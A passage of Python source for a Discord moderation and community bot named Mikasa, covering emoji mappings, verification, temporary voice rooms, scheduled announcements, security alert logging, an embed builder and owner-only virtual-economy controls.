    await ctx.send(f"✅ {'Removed mapping `' + name.lower() + '`' if name else 'Cleared all custom mappings'}.")

@bot.command(name="emojireload")
@commands.guild_only()
async def shinx_emojireload(ctx):
    # JSON is read on every operation, so this command validates current saved state.
    data = _emoji_map()
    await ctx.send(f"✅ Emoji mappings reloaded: {len(data.get(str(ctx.guild.id), {}))} mapping(s).")

@bot.command(name="emojiimport")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_emojiimport(ctx, *, raw_json: str = None):
    if not raw_json: return await ctx.send('Use `,emojiimport {"wave":"👋","heart":"❤️"}`.')
    try:
        incoming = json.loads(raw_json)
        if not isinstance(incoming, dict) or len(incoming) > 100 or any(not isinstance(k, str) or not isinstance(v, str) for k,v in incoming.items()):
            raise ValueError("Expected an object with up to 100 string-to-string mappings.")
        clean = {k.lower()[:40]: v[:100] for k,v in incoming.items()}
        data = _emoji_map(); data[str(ctx.guild.id)] = clean; save("custom_emoji_map", data)
        await ctx.send(f"✅ Imported {len(clean)} emoji mapping(s).")
    except Exception as exc:
        await ctx.send(f"❌ Invalid JSON: `{str(exc)[:180]}`")

@bot.command(name="setup")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_setup_dashboard(ctx, action: str = "status"):
    """A safe configuration health dashboard; does not wipe existing settings."""
    if action.lower() not in ("status", "check", "wizard"):
        return await ctx.send("Available: `,setup`, `,setup status`. This dashboard is read-only and won't reset settings.")
    me = ctx.guild.me
    checks = [
        ("View Audit Log", bool(me and me.guild_permissions.view_audit_log)),
        ("Manage Channels", bool(me and me.guild_permissions.manage_channels)),
        ("Manage Roles", bool(me and me.guild_permissions.manage_roles)),
        ("Ban Members", bool(me and me.guild_permissions.ban_members)),
        ("Manage Webhooks", bool(me and me.guild_permissions.manage_webhooks)),
    ]
    settings = load("server_settings"); gcfg = settings.get(str(ctx.guild.id), {}) if isinstance(settings, dict) else {}
    automod = load("paidbot_automod"); acfg = automod.get(str(ctx.guild.id), {}) if isinstance(automod, dict) else {}
    alt = _anti_alt_config(ctx.guild.id)
    log_ch = ctx.guild.get_channel(int(alt.get("log_channel_id"))) if str(alt.get("log_channel_id") or "").isdigit() else None
    lines = [f"{'✅' if ok else '⚠️'} **{label}:** {'Available' if ok else 'Missing'}" for label,ok in checks]
    lines += [f"**Anti-nuke:** {'Enabled' if gcfg.get('antinuke_enabled') else 'Disabled'}",
              f"**AutoMod:** {'Enabled' if acfg.get('enabled') else 'Not configured / disabled'}",
              f"**Anti-alt review:** {'Enabled' if alt.get('enabled') else 'Disabled'}",
              f"**Anti-alt log:** {log_ch.mention if log_ch else 'Not configured'}",
              f"**Prefix:** `{PREFIX}`"]
    e = discord.Embed(title="⚙️ Mikasa Server Setup & Health", description="\n".join(lines), color=COLORS["info"])
    e.set_footer(text="Check missing permissions before enabling automatic responses. No settings were changed.")
    await ctx.send(embed=e)

# Join-to-create temporary voice rooms, inspired by ShinxHub VoiceService.
@bot.command(name="jointocreate")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_jointocreate(ctx, channel: discord.VoiceChannel = None):
    """Set the voice channel members join to create their own temporary room; omit to disable."""
    data = load("voice_room_settings")
    if not isinstance(data, dict): data = {}
    gid = str(ctx.guild.id)
    if channel is None:
        data.pop(gid, None)
        save("voice_room_settings", data)
        return await ctx.send("✅ Join-to-create disabled for this server.")
    me = ctx.guild.me
    if not me or not me.guild_permissions.manage_channels or not me.guild_permissions.move_members:
        return await ctx.send("I need Manage Channels and Move Members to create and move members into temporary rooms.")
    data[gid] = {"creator_channel_id": channel.id, "category_id": channel.category_id}
    save("voice_room_settings", data)
    await ctx.send(f"✅ Members joining {channel.mention} will get a temporary voice room. Use `,jointocreate` without a channel to disable.")

@bot.listen("on_voice_state_update")
async def _shinx_temp_voice_rooms(member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    try:
        data = load("voice_room_settings")
        cfg = data.get(str(member.guild.id), {}) if isinstance(data, dict) else {}
        creator_id = int(cfg.get("creator_channel_id", 0)) if str(cfg.get("creator_channel_id", "")).isdigit() else 0
        temporary = load("temporary_voice_rooms")
        if not isinstance(temporary, dict): temporary = {}
        # Create a private-by-default room when a member enters the creator channel.
        if after.channel and after.channel.id == creator_id and before.channel != after.channel:
            me = member.guild.me
            if not me or not me.guild_permissions.manage_channels or not me.guild_permissions.move_members:
                return
            category = member.guild.get_channel(int(cfg.get("category_id"))) if str(cfg.get("category_id", "")).isdigit() else after.channel.category
            overwrites = {
                member.guild.default_role: discord.PermissionOverwrite(view_channel=True, connect=True),
                member: discord.PermissionOverwrite(view_channel=True, connect=True, manage_channels=True, move_members=True),
                me: discord.PermissionOverwrite(view_channel=True, connect=True, manage_channels=True, move_members=True),
            }
            room = await member.guild.create_voice_channel(
                name=f"🔊 {member.display_name[:80]}'s room",
                category=category if isinstance(category, discord.CategoryChannel) else None,
                overwrites=overwrites,
                reason="Join-to-create temporary voice room",
            )
            temporary[str(room.id)] = {"guild_id": member.guild.id, "owner_id": member.id}
            save("temporary_voice_rooms", temporary)
            await member.move_to(room, reason="Move member into their temporary voice room")
        # Delete a registered temporary room after its final member leaves.
        if before.channel and before.channel.id != creator_id and before.channel.id in {int(k) for k in temporary if str(k).isdigit()}:
            if len(before.channel.members) == 0:
                try: await before.channel.delete(reason="Temporary voice room is empty")
                except Exception: pass
                temporary.pop(str(before.channel.id), None)
                save("temporary_voice_rooms", temporary)
    except Exception as exc:
        print(f"[temporary voice rooms] {exc}")

# Persistent button-based member verification (no external service required).
class MikasaVerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", style=discord.ButtonStyle.success, emoji="✅", custom_id="mikasa:verify_member")
    async def verify_member_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        member = interaction.user
        if guild is None or not isinstance(member, discord.Member):
            return await interaction.response.send_message("Use this button inside the server.", ephemeral=True)
        settings = load("verification_settings")
        cfg = settings.get(str(guild.id), {}) if isinstance(settings, dict) else {}
        role_id = cfg.get("role_id")
        role = guild.get_role(int(role_id)) if str(role_id or "").isdigit() else None
        if role is None:
            return await interaction.response.send_message("Verification is not configured yet. Please contact server staff.", ephemeral=True)
        if role in member.roles:
            return await interaction.response.send_message("✅ You are already verified.", ephemeral=True)
        me = guild.me
        if not me or not me.guild_permissions.manage_roles or role >= me.top_role or role.managed:
            return await interaction.response.send_message("The verification role is misconfigured. Please contact server staff.", ephemeral=True)
        try:
            await member.add_roles(role, reason="Member completed Mikasa verification button")
            await interaction.response.send_message(f"✅ Verification complete. You received {role.mention}.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("I cannot assign the verification role. Staff must check my role position and permissions.", ephemeral=True)
        except Exception as exc:
            print(f"[verification button] {exc}")
            if not interaction.response.is_done():
                await interaction.response.send_message("Verification failed temporarily. Please try again later.", ephemeral=True)

@bot.command(name="verifysetup")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_verifysetup(ctx, role: discord.Role = None, channel: discord.TextChannel = None):
    """Configure and post a persistent verification panel: ,verifysetup @Verified #verify"""
    if role is None:
        data = load("verification_settings"); cfg = data.get(str(ctx.guild.id), {}) if isinstance(data, dict) else {}
        current = ctx.guild.get_role(int(cfg.get("role_id"))) if str(cfg.get("role_id") or "").isdigit() else None
        return await ctx.send(f"Current verification role: {current.mention if current else 'not configured'}. Use `,verifysetup @Verified #verify`.")
    channel = channel or ctx.channel
    me = ctx.guild.me
    if not me or not me.guild_permissions.manage_roles or role >= me.top_role or role.managed:
        return await ctx.send("I need Manage Roles, and my top role must be above the verification role.")
    data = load("verification_settings")
    if not isinstance(data, dict): data = {}
    data[str(ctx.guild.id)] = {"role_id": role.id, "channel_id": channel.id}
    save("verification_settings", data)
    try:
        bot.add_view(MikasaVerificationView())
        await channel.send(embed=discord.Embed(title="✅ Server Verification", description="Press the button below to receive the verified role and unlock the server.", color=COLORS["info"]), view=MikasaVerificationView())
        await ctx.send(f"✅ Verification panel posted in {channel.mention}; verified role: {role.mention}.")
    except Exception as exc:
        await ctx.send(f"Settings saved, but I couldn't post the panel: `{str(exc)[:180]}`")

@bot.listen("on_ready")
async def _shinx_register_persistent_verification_view():
    if not getattr(bot, "_mikasa_verify_view_registered", False):
        try:
            bot.add_view(MikasaVerificationView())
            bot._mikasa_verify_view_registered = True
        except Exception as exc:
            print(f"[verification view registration] {exc}")

# Persistent scheduled announcements (one-time; data survives restarts).
def _scheduled_messages():
    data = load("scheduled_messages")
    return data if isinstance(data, dict) else {}

@bot.command(name="schedule")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_schedule(ctx, action: str = "list", *, details: str = None):
    """Schedule one-time announcements, e.g. ,schedule add 30m #general | Event starts soon"""
    data = _scheduled_messages(); gid = str(ctx.guild.id); entries = data.setdefault(gid, [])
    action = action.lower()
    if action == "list":
        lines = [f"`{x['id']}` — <#{x['channel_id']}> — <t:{x['send_at']}:R> — {x['message'][:80]}" for x in entries[:20]]
        return await ctx.send(embed=discord.Embed(title="🗓️ Scheduled Announcements", description="\n".join(lines) if lines else "No scheduled announcements.", color=COLORS["info"]))
    if action in ("remove", "cancel", "pause", "resume"):
        if not details: return await ctx.send(f"Use `,schedule {action} <id>`.")
        sid = details.strip(); found = next((x for x in entries if str(x.get('id')) == sid), None)
        if not found: return await ctx.send("Schedule ID not found.")
        if action in ("remove", "cancel"): entries.remove(found)
        else: found["paused"] = action == "pause"
        save("scheduled_messages", data); return await ctx.send(f"✅ Schedule `{sid}` updated.")
    if action != "add" or not details or "|" not in details:
        return await ctx.send("Use `,schedule add 30m #channel | Your announcement`, or `,schedule list`.")
    left, message = [x.strip() for x in details.split("|",1)]
    m = re.fullmatch(r"(\d+)(m|h|d)", left.split()[0].lower()) if left else None
    if not m: return await ctx.send("Time must be like `10m`, `2h`, or `1d`.")
    amount = int(m.group(1)); unit = m.group(2)
    if amount < 1 or (unit == "m" and amount < 2) or amount > 30 and unit == "d": return await ctx.send("Choose at least 2 minutes and no more than 30 days.")
    channel_token = left.split(maxsplit=1)[1] if len(left.split(maxsplit=1)) > 1 else ""
    raw = channel_token.strip("<#>")
    channel = ctx.guild.get_channel(int(raw)) if raw.isdigit() else None
    if not isinstance(channel, discord.TextChannel): return await ctx.send("Mention a valid text channel before the `|`.")
    if not message or len(message) > 1800: return await ctx.send("Message must contain 1–1800 characters.")
    seconds = amount * {"m":60,"h":3600,"d":86400}[unit]
    sid = str(int(time.time())) + str(random.randint(10,99))
    entries.append({"id":sid,"channel_id":channel.id,"send_at":int(time.time()+seconds),"message":message,"paused":False,"creator_id":ctx.author.id})
    save("scheduled_messages", data)
    await ctx.send(f"✅ Announcement `{sid}` scheduled in {channel.mention} for <t:{int(time.time()+seconds)}:F>.")

@bot.listen("on_ready")
async def _shinx_schedule_dispatcher_start():
    task = getattr(bot, "_shinx_schedule_task", None)
    if task is None or task.done():
        bot._shinx_schedule_task = asyncio.create_task(_shinx_schedule_dispatcher())

async def _shinx_schedule_dispatcher():
    await bot.wait_until_ready()
    while not bot.is_closed():
        try:
            data = _scheduled_messages(); changed = False; now = int(time.time())
            for gid, entries in list(data.items()):
                guild = bot.get_guild(int(gid)) if str(gid).isdigit() else None
                for entry in list(entries):
                    if entry.get("paused") or int(entry.get("send_at", now+999999)) > now: continue
                    channel = guild.get_channel(int(entry.get("channel_id",0))) if guild else None
                    try:
                        if isinstance(channel, discord.TextChannel):
                            await channel.send(str(entry.get("message",""))[:1900], allowed_mentions=discord.AllowedMentions.none())
                    except Exception as exc: print(f"[schedule send] {exc}")
                    entries.remove(entry); changed = True
            if changed: save("scheduled_messages", data)
        except Exception as exc: print(f"[schedule dispatcher] {exc}")
        await asyncio.sleep(15)

# Add all newly introduced commands to the existing paginated help categories.
try:
    _append_help_items("gambling", [
        (",infmoney @user", "Owner only: grant a huge virtual wallet and bank balance"),
        (",removecoins @user <amount>", "Owner only: remove coins; oversized amounts safely clear the wallet"),
        (",removeinfmoney @user", "Owner only: clear a user's wallet and bank"),
        (",influck @user", "Owner only: guaranteed wins in supported gambling games"),
        (",removeinfluck @user", "Owner only: remove infinite luck"),
    ])
except Exception as _economy_help_error:
    print(f"[Mikasa economy help] {_economy_help_error}")

try:
    _append_help_items("security", [
        (",antialt status", "Review new-account risk settings"),
        (",antialt on|off", "Enable or disable new-account risk alerts (Manage Server)"),
        (",antialt minage <days>", "Set account-age risk threshold (0–365 days)"),
        (",antialt log #channel", "Set anti-alt review log channel"),
        (",antialt quarantine @role", "Set an optional quarantine role"),
    ])
    _append_help_items("setup", [
        (",setup status", "Check bot permissions and security setup health"),
        (",verifysetup @role #channel", "Configure a persistent verification panel"),
        (",jointocreate #voice-channel", "Create temporary voice rooms when members join a channel"),
        (",jointocreate", "Disable join-to-create voice rooms"),
        (",schedule add 30m #channel | message", "Schedule a one-time announcement"),
        (",schedule list", "List scheduled announcements"),
        (",schedule pause|resume|remove <id>", "Manage a scheduled announcement"),
        (",emojilist", "List custom emoji mappings"),
        (",emojireplace name 😀", "Create or replace an emoji mapping"),
        (",emojiinfo name", "Inspect a custom emoji mapping"),
        (",emojireset [name]", "Reset one or all custom emoji mappings"),
        (",emojireload", "Reload and count saved emoji mappings"),
        (",emojiimport <JSON>", "Import up to 100 emoji mappings"),
    ])
except Exception as _shinx_help_error:
    print(f"[ShinxHub help integration] {_shinx_help_error}")



# ── Unified Mikasa activity log destination ──────────────────────────────────
@bot.hybrid_command(name="setalllogs", description="Send Mikasa, moderation, AutoMod and security logs to one channel")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_set_all_logs(ctx, channel: discord.TextChannel = None):
    """Set one shared log channel, or show status when no channel is supplied."""
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    if channel is None:
        raw = gs.get("mikasa_all_logs_channel")
        current = ctx.guild.get_channel(int(raw)) if str(raw or "").isdigit() else None
        return await ctx.send(
            f"📋 **Unified logs:** {current.mention if current else 'Not configured'}\n"
            "Set with `,setalllogs #channel`. This routes Mikasa command activity, server events, "
            "moderation/security alerts, AntiNuke, AutoMod and anti-alt alerts to the same channel."
        )
    perms = channel.permissions_for(ctx.guild.me)
    if not perms.send_messages or not perms.embed_links:
        return await ctx.send("❌ I need Send Messages and Embed Links in that channel.")
    gs["mikasa_all_logs_channel"] = channel.id
    gs["security_log_channel"] = channel.id
    gs["antinuke_channel"] = channel.id
    gs["antinuke_alert_channel"] = channel.id
    save("server_settings", settings)
    # Route the existing general LoggingCog through the same channel.
    _LOG_CHANNELS[ctx.guild.id] = channel.id
    _ldata = load("log_channels")
    if not isinstance(_ldata, dict): _ldata = {}
    _ldata[str(ctx.guild.id)] = channel.id
    save("log_channels", _ldata)
    # Update existing AutoMod and anti-alt destinations too.
    try:
        _ad = load("paidbot_automod")
        if not isinstance(_ad, dict): _ad = {}
        _ac = _ad.setdefault(str(ctx.guild.id), {})
        _ac["log_channel_id"] = channel.id
        save("paidbot_automod", _ad)
    except Exception as exc:
        print(f"[unified logs] automod route: {exc}")
    try:
        _alt = _anti_alt_config(ctx.guild.id)
        _alt["log_channel_id"] = channel.id
        _save_anti_alt_config(ctx.guild.id, _alt)
    except Exception as exc:
        print(f"[unified logs] anti-alt route: {exc}")
    await ctx.send(f"✅ **All Mikasa logs now go to {channel.mention}.**\nIncludes command activity, member/message events, moderation, AntiNuke, AutoMod, anti-alt and security alerts.")
    await _mikasa_secure_log(ctx.guild, "Unified logging enabled", f"All available Mikasa log categories are routed to {channel.mention}. Configured by {ctx.author} (`{ctx.author.id}`).", color=0x57F287)

@bot.listen("on_command_completion")
async def _mikasa_log_command_activity(ctx):
    try:
        if not ctx.guild or not ctx.command:
            return
        await _mikasa_secure_log(
            ctx.guild, "🤖 Mikasa command used",
            f"**User:** {ctx.author} (`{ctx.author.id}`)\n"
            f"**Command:** `{ctx.command.qualified_name}`\n"
            f"**Channel:** {getattr(ctx.channel, 'mention', str(ctx.channel))}",
            color=0x5865F2,
        )
    except Exception as exc:
        print(f"[command activity log] {exc}")

# ── Mikasa SecurePlus additions: setup wizard, interactive embed builder, security audit events ──
# Alert-first design: records high-risk events, does not automatically punish users.

async def _mikasa_secure_log(guild: discord.Guild, title: str, detail: str, *, color: int = 0xED4245):
    """Send a concise security event to the configured security log channel."""
    try:
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        raw_id = (gs.get("mikasa_all_logs_channel") or gs.get("security_log_channel")
                  or gs.get("antinuke_channel") or gs.get("antinuke_alert_channel"))
        if not str(raw_id or "").isdigit():
            return
        channel = guild.get_channel(int(raw_id))
        if not channel or not hasattr(channel, "send"):
            return
        embed = discord.Embed(title=title[:256], description=detail[:3900], color=color, timestamp=discord.utils.utcnow())
        embed.set_footer(text=f"Mikasa Security Audit • Guild ID {guild.id}")
        await channel.send(embed=embed, allowed_mentions=discord.AllowedMentions.none())
    except Exception as exc:
        print(f"[Mikasa SecurePlus audit] {type(exc).__name__}: {exc}")

@bot.hybrid_command(name="securitysetup", description="Quickly configure Mikasa security alerts and join-burst monitoring")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_securitysetup(ctx, channel: discord.TextChannel):
    """Configure the alert channel and turn on alert-only RaidWatch."""
    if not channel.permissions_for(ctx.guild.me).send_messages or not channel.permissions_for(ctx.guild.me).embed_links:
        return await ctx.send("❌ I need Send Messages and Embed Links in that channel.", ephemeral=bool(getattr(ctx, "interaction", None)))
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    gs["security_log_channel"] = channel.id
    gs["antinuke_channel"] = channel.id
    gs["raidwatch_enabled"] = True
    gs.setdefault("raidwatch_threshold", 8)
    save("server_settings", settings)
    embed = discord.Embed(title="🛡️ Mikasa Security Setup", description=f"Security alerts: {channel.mention}\nRaidWatch: **ON** (alerts only)\nJoin threshold: **{int(gs.get('raidwatch_threshold', 8))} joins / 15 seconds**", color=0x57F287)
    embed.add_field(name="Next steps", value="1. Run `,securitycenter`\n2. Run `,securitycheck`\n3. Run `,securitytest`\n4. Review bot role position and permissions.", inline=False)
    embed.set_footer(text="This configures alerting; it does not guarantee complete protection.")
    await ctx.send(embed=embed, ephemeral=bool(getattr(ctx, "interaction", None)))
    await _mikasa_secure_log(ctx.guild, "Security setup changed", f"Configured security log channel to #{channel.name} ({channel.id}); RaidWatch enabled by {ctx.author} ({ctx.author.id}).", color=0x57F287)

class _MikasaEmbedModal(discord.ui.Modal, title="Mikasa Embed Builder"):
    title_text = discord.ui.TextInput(label="Embed title", max_length=256, required=True, placeholder="Announcement title")
    description_text = discord.ui.TextInput(label="Description", style=discord.TextStyle.paragraph, max_length=3500, required=True, placeholder="Write your message here")
    color_text = discord.ui.TextInput(label="Color (hex, optional)", max_length=7, required=False, default="#5865F2", placeholder="#5865F2")
    footer_text = discord.ui.TextInput(label="Footer (optional)", max_length=2048, required=False, placeholder="SFZ Community • Mikasa")
    def __init__(self, target_channel: discord.TextChannel, requester_id: int):
        super().__init__(timeout=180)
        self.target_channel = target_channel
        self.requester_id = int(requester_id)
    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != self.requester_id:
            return await interaction.response.send_message("Only the person who opened this builder can use it.", ephemeral=True)
        raw = str(self.color_text.value or "#5865F2").strip().lstrip("#")
        try:
            color = int(raw, 16) if len(raw) in (3, 6) and all(c in "0123456789abcdefABCDEF" for c in raw) else 0x5865F2
            if len(raw) == 3:
                color = int(''.join(ch*2 for ch in raw), 16)
        except Exception:
            color = 0x5865F2
        embed = discord.Embed(title=str(self.title_text.value), description=str(self.description_text.value), color=color)
        if str(self.footer_text.value).strip():
            embed.set_footer(text=str(self.footer_text.value).strip())
        embed.timestamp = discord.utils.utcnow()
        view = _MikasaEmbedPublishView(self.requester_id, self.target_channel, embed)
        await interaction.response.send_message(content=f"Preview for {self.target_channel.mention}. Press **Publish embed** to send it.", embed=embed, view=view, ephemeral=True, allowed_mentions=discord.AllowedMentions.none())

class _MikasaEmbedPublishView(discord.ui.View):
    def __init__(self, requester_id: int, target_channel: discord.TextChannel, embed: discord.Embed):
        super().__init__(timeout=180)
        self.requester_id = int(requester_id)
        self.target_channel = target_channel
        self.embed = embed
    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.requester_id:
            await interaction.response.send_message("Only the person who opened this builder can publish it.", ephemeral=True)
            return False
        if not interaction.guild or interaction.guild.id != self.target_channel.guild.id:
            await interaction.response.send_message("This embed belongs to another server.", ephemeral=True)
            return False
        return True
    @discord.ui.button(label="Publish embed", style=discord.ButtonStyle.success, emoji="📨")
    async def publish(self, interaction: discord.Interaction, button: discord.ui.Button):
        perms = self.target_channel.permissions_for(interaction.guild.me)
        if not perms.send_messages or not perms.embed_links:
            return await interaction.response.send_message("I need Send Messages and Embed Links in the target channel.", ephemeral=True)
        try:
            await self.target_channel.send(embed=self.embed, allowed_mentions=discord.AllowedMentions.none())
            for child in self.children:
                child.disabled = True
            await interaction.response.edit_message(content=f"✅ Embed published in {self.target_channel.mention}.", view=self)
            await _mikasa_secure_log(interaction.guild, "Embed published", f"{interaction.user} ({interaction.user.id}) published an embed in #{self.target_channel.name} ({self.target_channel.id}).", color=0x57F287)
        except discord.Forbidden:
            await interaction.response.send_message("I don't have permission to publish in that channel.", ephemeral=True)
    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, emoji="✖️")
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="Embed publishing cancelled.", embed=None, view=self)

@bot.command(name="embedbuilder", aliases=["makeembed", "embedcreate"])
@commands.guild_only()
@commands.has_guild_permissions(manage_messages=True)
async def _mikasa_embedbuilder(ctx, channel: discord.TextChannel = None):
    """Open an interactive embed builder. Requires Manage Messages."""
    target = channel or (ctx.channel if isinstance(ctx.channel, discord.TextChannel) else None)
    if target is None:
        return await ctx.send("Choose a text channel for the embed.")
    perms = target.permissions_for(ctx.guild.me)
    if not perms.send_messages or not perms.embed_links:
        return await ctx.send("❌ I need Send Messages and Embed Links in the target channel.")
    view = discord.ui.View(timeout=180)
    button = discord.ui.Button(label="Open embed builder", style=discord.ButtonStyle.primary, emoji="🧩")
    async def open_builder(interaction: discord.Interaction):
        if interaction.user.id != ctx.author.id:
            return await interaction.response.send_message("Only the person who ran the command can open this builder.", ephemeral=True)
        await interaction.response.send_modal(_MikasaEmbedModal(target, ctx.author.id))
    button.callback = open_builder
    view.add_item(button)
    await ctx.send(f"🧩 **Mikasa Embed Builder**\nTarget channel: {target.mention}\nOnly you can use this builder. Click below to edit the title, description, color and footer.", view=view)

# Additional audit event listeners. These are alert-only and never auto-punish.
@bot.listen("on_guild_channel_delete")
async def _mikasa_audit_channel_delete(channel: discord.abc.GuildChannel):
    await _mikasa_secure_log(channel.guild, "🚨 Channel deleted", f"Channel: #{getattr(channel, 'name', 'unknown')} ({channel.id})\nType: {type(channel).__name__}\nActor: check the Discord Audit Log; event attribution may be delayed.")

@bot.listen("on_guild_role_delete")
async def _mikasa_audit_role_delete(role: discord.Role):
    await _mikasa_secure_log(role.guild, "🚨 Role deleted", f"Role: {role.name} ({role.id})\nActor: check the Discord Audit Log; event attribution may be delayed.")

@bot.listen("on_guild_role_update")
async def _mikasa_audit_role_update(before: discord.Role, after: discord.Role):
    changes = []
    if before.name != after.name: changes.append(f"Name: {before.name!r} → {after.name!r}")
    if before.permissions != after.permissions: changes.append("Permissions changed")
    if before.position != after.position: changes.append(f"Position: {before.position} → {after.position}")
    if changes:
        await _mikasa_secure_log(after.guild, "⚠️ Role changed", f"Role: {after.name} ({after.id})\n" + "\n".join(changes) + "\nActor: check the Discord Audit Log.", color=0xFEE75C)

@bot.listen("on_webhooks_update")
async def _mikasa_audit_webhooks_update(channel: discord.TextChannel):
    await _mikasa_secure_log(channel.guild, "⚠️ Webhooks updated", f"Channel: #{channel.name} ({channel.id})\nReview the Discord Audit Log and remove unknown webhooks if needed.", color=0xFEE75C)

@bot.listen("on_member_ban")
async def _mikasa_audit_member_ban(guild: discord.Guild, user: discord.User):
    await _mikasa_secure_log(guild, "⚠️ Member banned", f"Target: {user} ({user.id})\nActor and reason: check the Discord Audit Log.", color=0xFEE75C)

@bot.listen("on_guild_update")
async def _mikasa_audit_guild_update(before: discord.Guild, after: discord.Guild):
    changes = []
    if before.name != after.name: changes.append(f"Server name changed: {before.name!r} → {after.name!r}")
    if before.verification_level != after.verification_level: changes.append(f"Verification level: {before.verification_level} → {after.verification_level}")
    if before.default_notifications != after.default_notifications: changes.append("Default notification setting changed")
    if changes:
        await _mikasa_secure_log(after, "⚠️ Server settings changed", "\n".join(changes) + "\nActor: check the Discord Audit Log.", color=0xFEE75C)


# Include the new tools in Mikasa's existing category-based help menu.
try:
    _append_help_items("security", [
        (",securitysetup #security-logs", "Quick setup: security alerts + alert-only RaidWatch"),
        (",securitycenter", "Open the Security Intelligence Center"),
        (",auditrecent", "Review recent Discord audit-log entries"),
    ])
    _append_help_items("setup", [
        (",embedbuilder [#channel]", "Interactive embed builder with preview and publish confirmation"),
        (",securitysetup #security-logs", "Configure security alerts and join-burst monitoring"),
    ])
except Exception as _secureplus_help_error:
    print(f"[Mikasa SecurePlus help] {_secureplus_help_error}")


# ── Owner-only economy controls: server-scoped infinite balance + luck ─────
_MIKASA_INFINITE_BALANCE = 10 ** 30  # large virtual balance; no real-money value

def _guild_flag_enabled(ud: dict, flag: str, guild_id) -> bool:
    """Read a guild-scoped override. Legacy global flags are intentionally ignored."""
    if guild_id is None or not isinstance(ud, dict):
        return False
    values = ud.get(flag + "_guilds", [])
    return str(guild_id) in {str(x) for x in values} if isinstance(values, (list, set, tuple)) else False

def _guild_luck_percent(ud: dict, guild_id):
    """Return this server's luck override, or None when it has not been set."""
    if guild_id is None or not isinstance(ud, dict):
        return None
    values = ud.get("luck_percent_guilds", {})
    if not isinstance(values, dict) or str(guild_id) not in values:
        return None
    try:
        return max(0, min(100, int(values[str(guild_id)])))
    except (TypeError, ValueError):
        return None

@bot.command(name="infmoney", aliases=["infinitecoins", "giveinfmoney"])
async def _mikasa_infmoney(ctx, member: discord.Member):
    """Enable infinite-money mode only in the server where this command is used."""
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    if ctx.guild is None:
        return await ctx.send("❌ Use this command inside the server where you want to grant it.")
    ud = get_pokemon_data(str(member.id))
    guilds = {str(x) for x in ud.get("infinite_money_guilds", [])} if isinstance(ud.get("infinite_money_guilds", []), (list, set, tuple)) else set()
    guilds.add(str(ctx.guild.id))
    ud["infinite_money_guilds"] = sorted(guilds)
    # The dict proxy writes these values into this guild's wallet/bank overrides only.
    ud["balance"] = _MIKASA_INFINITE_BALANCE
    ud["bank"] = _MIKASA_INFINITE_BALANCE
    save_pokemon_data(str(member.id), ud)
    await ctx.send(embed=discord.Embed(title="♾️ Server-Only Infinite Money Enabled", description=f"Granted **{member.mention}** a huge wallet and bank balance in **{ctx.guild.name}** only. Other servers keep their own balances.", color=COLORS["success"]))

@bot.command(name="removecoins", aliases=["coinsremoveall", "burncoins"])
async def _mikasa_removecoins(ctx, member: discord.Member, amount: str):
    """Remove a specified amount; amounts above the balance simply clear it. Primary owner only."""
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    try:
        amount_int = int(amount.replace(",", "").replace("_", ""))
    except (TypeError, ValueError):
        return await ctx.send("Usage: `,removecoins @user <amount>`")
    if amount_int <= 0:
        return await ctx.send("❌ Amount must be greater than zero.")
    ud = get_pokemon_data(str(member.id))
    old_balance = max(0, int(ud.get("balance", 0)))
    removed = min(old_balance, amount_int)
    ud["balance"] = max(0, old_balance - amount_int)
    save_pokemon_data(str(member.id), ud)
    await ctx.send(embed=discord.Embed(title="🪙 Coins Removed", description=f"Removed **{removed:,}** coins from {member.mention}. New wallet balance: **{ud['balance']:,}** coins.", color=COLORS["success"]))

@bot.command(name="removeinfmoney", aliases=["takeinfmoney", "clearcoinsall"])
async def _mikasa_removeinfmoney(ctx, member: discord.Member):
    """Remove infinite-money status only from the current server."""
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    if ctx.guild is None:
        return await ctx.send("❌ Use this command inside the server where you want to remove it.")
    ud = get_pokemon_data(str(member.id))
    guilds = {str(x) for x in ud.get("infinite_money_guilds", [])} if isinstance(ud.get("infinite_money_guilds", []), (list, set, tuple)) else set()
    guilds.discard(str(ctx.guild.id))
    ud["infinite_money_guilds"] = sorted(guilds)
    # Delete this server's overrides; the user's normal balance is shown again here.
    for _key in ("balance_by_guild", "bank_by_guild"):
        _values = ud.get(_key, {})
        if isinstance(_values, dict):
            _values = dict(_values)
            _values.pop(str(ctx.guild.id), None)
            ud[_key] = _values
    save_pokemon_data(str(member.id), ud)
    await ctx.send(embed=discord.Embed(title="🧹 Server-Only Infinite Money Removed", description=f"Removed infinite-money status for **{member.mention}** in **{ctx.guild.name}** only. Their normal wallet and bank are restored in this server.", color=COLORS["success"]))

@bot.command(name="influck", aliases=["infinateluck", "giveinfluck"])
async def _mikasa_influck(ctx, member: discord.Member):
    """Enable guaranteed wins only in the current server's supported games."""
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    if ctx.guild is None:
        return await ctx.send("❌ Use this command inside the server where you want to grant it.")
    ud = get_pokemon_data(str(member.id))
    guilds = {str(x) for x in ud.get("infinite_luck_guilds", [])} if isinstance(ud.get("infinite_luck_guilds", []), (list, set, tuple)) else set()
    guilds.add(str(ctx.guild.id))
    ud["infinite_luck_guilds"] = sorted(guilds)
